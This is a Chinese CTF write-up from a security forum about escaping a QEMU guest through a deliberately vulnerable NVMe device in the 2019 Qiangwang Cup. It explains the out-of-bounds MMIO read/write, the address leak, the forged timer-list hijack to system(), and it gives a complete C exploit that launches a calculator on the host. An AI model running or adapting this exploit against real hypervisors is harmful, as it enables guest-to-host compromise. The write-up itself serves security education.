
# [原创]2019强网杯线下赛qemu虚拟机逃逸

## 题目描述

该题以 qemu 虚拟机软件的某 CVE 漏洞为参考，在 qemu 某模块中置入存在漏洞的代码，导致一些不可预测的执行流程，从而完成虚拟机逃逸攻击。选手需要在运行在 qemu 虚拟机中的 ubuntu 操作系统下进行逃逸操作，尝试触发漏洞并在宿主机（Deepin Linux）中执行任意代码。

题目给出了宿主机（Deepin Linux）的虚拟机镜像。在宿主机上运行 qemu 虚拟机中的 ubuntu 操作系统。题目要求在 ubuntu 操作系统中执行程序进行逃逸操作，在宿主机（Deepin Linux）中使用 chrome 打开本地某页面。

比赛时队里大佬做了出来。本菜鸡赛后找了点时间分析了一下。

## 漏洞点探索

### `diff` 的尝试

查看漏洞程序版本，下载同版本 qemu 代码进行编译。粗略的 `diff` 后发现存在大量的改动，无法定位漏洞位置。

![](https://bbs.kanxue.com/upload/attach/202002/770523_WFH6GS35AWCWRPA.jpg)

查看 qemu 命令启动行：

```
./qemu-system-x86_64 -m 1024 -smp 2 -boot c -cpu host -hda ubuntu_server.qcow2 --enable-kvm -drive file=./blknvme,if=none,id=D22 -device nvme,drive=D22,serial=1234 -net user,hostfwd=tcp::2222-:22 -net nic
```

根据 `-device nvme`，猜测漏洞可能出现在对 `nvme` 设备模拟的函数中。对 `nvme` 系列函数进行分析，发现 `nvme_mmio_read()` 及 `nvme_mmio_write()` 相较正常版本中未对请求访问的地址进行校验，可能存在越界读写漏洞。

正常版本 `nvme_mmio_read()` 部分：

![](https://bbs.kanxue.com/upload/attach/202002/770523_7CX8XNSDAUCJ89E.jpg)

漏洞版本 `nvme_mmio_read()` 部分：

![](https://bbs.kanxue.com/upload/attach/202002/770523_WZNC43VAGEJC2P4.jpg)

## 漏洞函数触发

同普通的 CTF 赛题不同，普通 pwn 题会有菜单或逻辑简单容易分析，能够随心所欲地选择程序流程。所以下一步需要考虑如何触发漏洞函数。

经查阅资料得知，这两个函数用于对设备 BAR 空间进行读写。

在此需要先了解 `nvme` 设备的基础结构。

`nvme` 是一种控制协议，用于访问通过 PCI-Express（PCIe）总线附加的非易失性内存介质（SSD 设备）。

PCIe 的 Header 空间和 BAR 空间是 PCIe 得以广泛使用的关键特性。

Header 空间是 PCIe 设备的通有属性，所有的 PCIe Spec 功能和规范都在这里实现。PCIe Header 空间中有几个寄存器专门用来存储 BAR 空间地址，一个 PCIe 设备有 6 个 32 位 BAR 寄存器。

BAR 空间是 PCIe 设备体现自己功能的地方。NVMe 协议在 BAR 空间上定义了一系列的寄存器。有了这些寄存器，Host 就可以与 NVMe SSD 的 Controller 进行交互了。

NVMe 设置 BAR 空间上的寄存器，将 BAR 空间使用 mmio 方式映射到系统地址空间。用户打开设备，`mmap` 后即可使用普通的访存指令直接访问设备的寄存器。

`dev->bar = ioremap(pci_resource_start(pdev, 0), 8192);`

此后，驱动就可以通过 `dev->bar` 加上寄存器的偏移地址（如 Controller Status 的偏移地址是 `0x1C`），使用 `writel`、`readl` 这类函数访问 Controller 寄存器了。

关于 PCIe 更多信息请自行搜索。大意就是设备将 BAR 空间映射在 host 内存中，host 通过这个空间与设备交互。

### 访问 BAR 空间

在 `nvme` 驱动初始化过程中，做了以下几件事情：

1. 将 BAR 空间使用 mmio 方式映射到系统地址空间。
2. host 发送第一次 `identify` 命令，获取 controller 等配置，这些配置信息包括 namespace 个数。
3. host 接下来针对每个 namespace 发送 `identify` 命令，获取每个 namespace 的配置信息。通过 `add_disk()` 将每个 namespace 加入到块设备层，IO 就可以开始对其进行访问。

在 `/sys/module` 目录下一路跟随 `nvme` 目录能够进入设备文件所在文件夹 `0000:00:04.0`。

![](https://bbs.kanxue.com/upload/attach/202002/770523_2TUDM2QMH8VCPHV.jpg)

其中：

![](https://bbs.kanxue.com/upload/attach/202002/770523_K7ENSJJD5BFXVR4.jpg)

`config` 是配置空间对用户的接口。

`resource0`、`resource1`、`resource2` 等是从“PCI 配置空间”解析出来的资源定义段落分别生成的，它们是 PCI 总线驱动在 PCI 设备初始化阶段加上去的，都是二进制属性，但没有实现读写接口，只支持 `mmap` 内存映射接口，尝试进行读写会提示 IO 错误。它们用于应用程序的内存映射，就可以访问对应的 PCI 设备上相应的内存资源段落。

经观察 `resource0` 大小正好为 8192，与 BAR 空间吻合。

提前使用 `gdb` 附加 qemu，在 `nvme_mmio_write()` 上下断点，打开此设备通过 `mmap` 方式写入。断点触发，判定 `resource0` 文件即为 BAR 空间内存映射。通过 `mmap` 的方式使用访存指令即可与 `nvme` 设备交互，触发漏洞函数。

## 漏洞利用

### 信息泄露

通过 `gdb` 分析，qemu 使用堆来模拟 BAR 空间（使用读写文件来模拟硬盘不知真假 23333）。

通过堆越界读的方式我们可以得知 BAR 空间的地址及程序加载基址，通过基址与 `system` 的 PLT 地址相加得到 `system` 地址。

![](https://bbs.kanxue.com/upload/attach/202002/770523_V94NX9ERUSS75C8.jpg)

### 控制程序流程

堆的越界写存在限制，只能进行堆上的编辑。

![](https://bbs.kanxue.com/upload/attach/202002/770523_JCZU9DTR2BAYCFG.jpg)

简单了解了一下 BAR 空间的使用原理：

NVMe 的 BAR 空间地址分配如下：前 `0x1000` 都是寄存器空间，之后是 SQ、CQ 队列的 doorbell。

```
* NVMe Controller Registers *

NVME_CAP       = 0x0000, /* Controller Capabilities, 64bit */
NVME_CMD_SS    = 0x0F00, /* Command Set Specific */
NVME_SQ0TDBL   = 0x1000, /* SQ 0 Tail Doorbell, 32bit (Admin) */
NVME_CQ0HDBL   = 0x1004, /* CQ 0 Head Doorbell, 32bit (Admin) */
NVME_SQ1TDBL   = 0x1008, /* SQ 1 Tail Doorbell, 32bit */
NVME_CQ1HDBL   = 0x100c, /* CQ 1 Head Doorbell, 32bit */
NVME_SQMAXTDBL = (NVME_SQ0TDBL + 8 * NVME_MAX_QID),
NVME_CQMAXHDBL = (NVME_CQ0HDBL + 8 * NVME_MAX_QID)
};
```

当 host 需要设备完成任务时，将任务插入 SQ 队列。任务完成后，将返回信息进入 CQ 队列。

doorbell 用于记录队列的 head 和 tail，同时具有通知作用。当写入此地址时，代表队列有新的指令来了需要处理，会设置定时器进行执行。

插入队列同时更新对应 doorbell 地址，设置定时器。其中 SQ 队列在 BAR 前 `0x1000` 字节中。我们可以写入伪造。再返回漏洞函数。发现写入 `0x1000` 以上 doorbell 区域时会进入 `process_db()` 函数。此函数即为 doorbell 工作函数。

选择触发 `0x1000` 位置的 SQ0 doorbell。分析 `process_db()` 函数可以得到 SQ 队列数组的地址 `0xb90 - 0xac0 = 0xd0`，即 BAR 空间偏移 `0xd0` 位置。

![](https://bbs.kanxue.com/upload/attach/202002/770523_DRNYX3E99R585QB.jpg)

`v9` 未分析。`v14` 参数我们可以通过越界写入伪造。伪造 `v14` 参数（SQ 队列）为堆上某空白地址 `sq`。将 `sq + 0x14` 地址写入 `0xffffffff` 保证 `v9` 校验通过。进入 `timer_mod()` 函数。

![](https://bbs.kanxue.com/upload/attach/202002/770523_SSGUEK63F4S4ZRM.jpg)

进入 `timer_mod_ns()` 函数，参数 `a1` 可控制。

之后流程不一一介绍。

`nvme_mmio_write() -> process_db() -> timer_mod() -> timer_mod_ns() -> timerlist_rearm() -> timerlist_notify()`。

![](https://bbs.kanxue.com/upload/attach/202002/770523_JNY4VRB44JXFBY3.jpg)

在 `timerlist_notify()` 中找到地址调用。此时参数 `a1` 依旧可控。根据定时任务猜测 `a1` 参数为 `time_list` 结构体。

使 `a1 + 0x58` 位置为 `system` 函数。使 `a1 + 0x60` 为堆上某地址（写入命令）。即可完成利用。

### 利用程序

```c
#include <stdio.h>

#include <sys/mman.h>

#include <sys/types.h>

#include <fcntl.h>



char* base;

char cmd[] = "deepin-calculator\0";



void write_dword(long long addr, long  value)

{

	*((long *)(base + addr)) = value;

}





void write_qword(long long addr, long long value)

{

	*((long long*)(base + addr)) = value;

}



long long read_dword(long long addr)

{

	return *((long long*)(base + addr));

}





int main()

{

	int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);

	base = mmap(0, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

	long long elf_ptr = read_dword(0x11C0);

	long long elf_base = elf_ptr - 0x760b44;

	long long system = elf_base + 0x2BC600;

	printf("ELF:0x%llx\n", elf_base);



	long long heap_ptr = read_dword(0x170);

	long long bar = heap_ptr - 0xe0;

	printf("Bar base : 0x%llx\n", bar);

	int offset = 0x400;

	int sq_offset = 0x420;

	int timer_offset = 0x500;

	int timerlist_offset = 0x580;

	int cmd_offset = 0x700;

	

	write_qword(0xd0, bar+offset);

	write_qword(offset, bar+sq_offset);

	write_dword(sq_offset+0x14, 0xFFFFFFFF);

	write_qword(sq_offset+0x20, bar+timer_offset);



for (int i = 0; i < strlen(cmd); i+=8) {

		write_qword(cmd_offset+i, *(long long *)(cmd+i));

	}

	write_qword(timer_offset+8, bar+timerlist_offset);

	write_qword(timerlist_offset+0x0, bar+0x600);

	write_dword(timerlist_offset+0x3C, 0x1);

	write_qword(timerlist_offset+0x40, 0);

	write_qword(timerlist_offset+0x58, system);

	write_qword(timerlist_offset+0x60, bar+cmd_offset);



	write_dword(0x1000, 0);

	return 0;

}
```

## 结果

![](https://bbs.kanxue.com/upload/attach/202002/770523_48YGUYBNHUYTGQ3.jpg)

完整题目附件太大，上传不了。可以自己下一个内核、文件系统，实验一下 2333333。

漏洞文件：链接: e33K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6Q4x3X3g2T1j5h3W2V1N6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4Q4x3V1j5I4N6r3g2z5f1X3k6$3N6$3E0f1f1%4W2X3e0p5I4I4h3V1N6a6N6%4k6K6b7b7`.`. 提取码: 4bic

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

